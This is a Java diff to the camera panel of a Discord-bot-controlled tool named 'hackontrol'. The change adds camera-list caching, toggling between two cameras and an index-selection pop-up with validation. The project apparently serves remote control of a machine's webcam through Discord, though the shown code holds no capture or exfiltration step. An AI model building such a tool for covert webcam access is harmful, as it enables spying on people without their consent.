@@ -8,12 +8,17 @@ import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.service.interaction.InteractionManager;
-import com.khopan.hackontrol.service.interaction.context.ButtonContext;
+import com.khopan.hackontrol.service.interaction.ModalManager;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
+import com.khopan.hackontrol.utils.sendable.sender.ReplyCallbackSendable;
 
+import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
+import net.dv8tion.jda.api.interactions.components.text.TextInput;
+import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
 
 public class CameraPanel extends Panel {
 	private static final String PANEL_NAME = "camera";
@@ -31,10 +36,14 @@ public class CameraPanel extends Panel {
 
 	@Override
 	public void registeration() {
-		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAMERA_LIST, this :: send);
+		this.register(Registration.BUTTON, CameraPanel.BUTTON_CAMERA_LIST, context -> {
+			this.cameraList = Camera.list();
+			this.send(context);
+		});
+
 		this.register(Registration.BUTTON, CameraPanel.BUTTON_REFRESH,     context -> {
 			this.send(context);
-			HackontrolButton.deleteMessages(context);
+			HackontrolMessage.delete(context);
 		});
 	}
 
@@ -47,18 +56,16 @@ public class CameraPanel extends Panel {
 		};
 	}
 
-	private void send(ButtonContext context) {
-		Camera[] cameraList = Camera.list();
-
-		if(cameraList == null || cameraList.length == 0) {
-			HackontrolError.message(context.reply(), "No camera available");
+	private void send(IReplyCallback callback) {
+		if(this.cameraList == null || this.cameraList.length == 0) {
+			HackontrolError.message(ReplyCallbackSendable.of(callback), "No camera available");
 			return;
 		}
 
 		StringBuilder builder = new StringBuilder();
 		boolean hasSelected = false;
 
-		for(int i = 0; i < cameraList.length; i++) {
+		for(int i = 0; i < this.cameraList.length; i++) {
 			if(i > 0) {
 				builder.append('\n');
 			}
@@ -95,13 +102,49 @@ public class CameraPanel extends Panel {
 			if(cameraList.length == 1) {
 				this.selected = cameraList[0];
 				this.send(buttonContext);
-				HackontrolButton.deleteMessages(buttonContext);
+				HackontrolMessage.delete(buttonContext);
 				return;
+			} else if(this.cameraList.length == 2) {
+				Camera newSelected = null;
+
+				if(this.cameraList[0].equals(this.selected)) {
+					newSelected = this.cameraList[1];
+				} else if(this.cameraList[1].equals(this.selected)) {
+					newSelected = this.cameraList[0];
+				}
+
+				if(newSelected != null) {
+					this.selected = newSelected;
+					this.send(buttonContext);
+					HackontrolMessage.delete(buttonContext);
+					return;
+				}
 			}
+
+			buttonContext.replyModal(ModalManager.dynamicModal("Select Camera", modalContext -> {
+				String text = modalContext.getValue("cameraIndex").getAsString();
+				int index;
+
+				try {
+					index = Integer.parseInt(text);
+				} catch(Throwable Errors) {
+					HackontrolError.message(modalContext.reply(), "Invalid number format");
+					return;
+				}
+
+				if(index < 1 || index > this.cameraList.length) {
+					HackontrolError.message(modalContext.reply(), "Index " + index + " out of bounds, expected 1 - " + this.cameraList.length);
+					return;
+				}
+
+				this.selected = this.cameraList[index - 1];
+				this.send(modalContext);
+				HackontrolMessage.delete(buttonContext);
+			}).addActionRow(TextInput.create("cameraIndex", "Camera Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(this.cameraList.length).length()).setPlaceholder("1 - " + this.cameraList.length).build()).build()).queue();
 		}));
 
 		list.add(CameraPanel.BUTTON_REFRESH);
 		list.add(HackontrolButton.delete());
-		context.reply(builder.toString()).addActionRow(list).queue(InteractionManager :: callback);
+		callback.reply(builder.toString()).addActionRow(list).queue(InteractionManager :: callback);
 	}
 }
